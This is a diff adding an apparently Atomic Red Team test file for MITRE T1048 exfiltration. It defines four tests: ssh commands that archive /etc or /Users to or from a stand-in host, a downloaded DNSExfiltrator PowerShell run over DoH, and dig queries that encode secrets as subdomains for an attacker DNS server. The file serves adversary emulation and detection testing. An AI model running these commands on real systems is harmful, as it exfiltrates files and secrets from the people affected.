@@ -1,0 +1,148 @@
+{
+  "attack_technique": "T1048",
+  "display_name": "Exfiltration Over Alternative Protocol",
+  "atomic_tests": [
+    {
+      "name": "Exfiltration Over Alternative Protocol - SSH",
+      "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.",
+      "supported_platforms": [
+        "macos",
+        "linux"
+      ],
+      "executor": {
+        "name": "sh",
+        "elevation_required": false,
+        "command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz"
+      },
+      "input_arguments": {
+        "domain": {
+          "description": "target SSH domain",
+          "type": "url",
+          "default": "target.example.com"
+        }
+      },
+      "auto_generated_guid": "f6786cc8-beda-4915-a4d6-ac2f193bb988"
+    },
+    {
+      "name": "Exfiltration Over Alternative Protocol - SSH",
+      "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.",
+      "supported_platforms": [
+        "macos",
+        "linux"
+      ],
+      "executor": {
+        "name": "sh",
+        "elevation_required": false,
+        "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'"
+      },
+      "input_arguments": {
+        "user_name": {
+          "description": "username for domain",
+          "type": "string",
+          "default": "atomic"
+        },
+        "password": {
+          "description": "password for user",
+          "type": "string",
+          "default": "atomic"
+        },
+        "domain": {
+          "description": "target SSH domain",
+          "type": "url",
+          "default": "target.example.com"
+        }
+      },
+      "auto_generated_guid": "7c3cb337-35ae-4d06-bf03-3032ed2ec268"
+    },
+    {
+      "name": "DNSExfiltration (doh)",
+      "description": "DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "Import-Module \"#{ps_module}\"\nInvoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}"
+      },
+      "input_arguments": {
+        "password": {
+          "description": "Password used to encrypt the data to be exfiltrated",
+          "type": "string",
+          "default": "atomic"
+        },
+        "domain": {
+          "description": "The domain name to use for DNS requests",
+          "type": "string",
+          "default": "target.example.com"
+        },
+        "ps_module": {
+          "description": "DNSExfiltrator powershell ps_module",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1"
+        },
+        "doh": {
+          "description": "Google or CloudFlare DoH (DNS over HTTP) server",
+          "type": "string",
+          "default": "google"
+        },
+        "time": {
+          "description": "The time in milliseconds to wait between each DNS request",
+          "type": "string",
+          "default": "500"
+        },
+        "encoding": {
+          "description": "Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.",
+          "type": "string",
+          "default": null
+        }
+      },
+      "dependencies": [
+        {
+          "description": "DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})",
+          "prereq_command": "if (Test-Path \"#{ps_module}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIWR \"https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1\" -OutFile \"#{ps_module}\""
+        }
+      ],
+      "auto_generated_guid": "c943d285-ada3-45ca-b3aa-7cd6500c6a48"
+    },
+    {
+      "name": "Exfiltrate Data using DNS Queries via dig",
+      "description": "This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and \nmaking DNS queries via the dig command to a controlled DNS server.",
+      "supported_platforms": [
+        "macos",
+        "linux"
+      ],
+      "executor": {
+        "name": "bash",
+        "elevation_required": false,
+        "command": "dig @#{attacker_dns_server} -p #{dns_port} $(echo \"#{secret_info}\" | base64).google.com"
+      },
+      "input_arguments": {
+        "dns_port": {
+          "description": "Attacker's DNS server port",
+          "type": "integer",
+          "default": "53"
+        },
+        "attacker_dns_server": {
+          "description": "Attacker's DNS server address",
+          "type": "string",
+          "default": "8.8.8.8"
+        },
+        "secret_info": {
+          "description": "secret info that will be exfiltirated",
+          "type": "string",
+          "default": "this is a secret info"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "dig command",
+          "prereq_command": "which dig",
+          "get_prereq_command": "which apt && sudo apt update && sudo apt install -y bind9-dnsutils || which yum && sudo yum install -y bind-utils || which dnf && sudo dnf install -y bind-utils || which apk && sudo apk add bind-tools || which pkg && sudo pkg update && sudo pkg install -y bind-tools || which brew && brew update && brew install --quiet bind"
+        }
+      ],
+      "auto_generated_guid": "a27916da-05f2-4316-a3ee-feec67a437be"
+    }
+  ]
+}
